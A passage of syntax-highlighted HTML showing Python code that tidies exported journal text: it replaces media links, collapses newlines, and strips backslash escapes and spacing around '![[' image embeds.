style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;text&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; oldMediaLink&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; newMediaLink &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryMedia&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;items&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;():&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;oldMediaLink&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; newMediaLink&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;~&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;~&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; 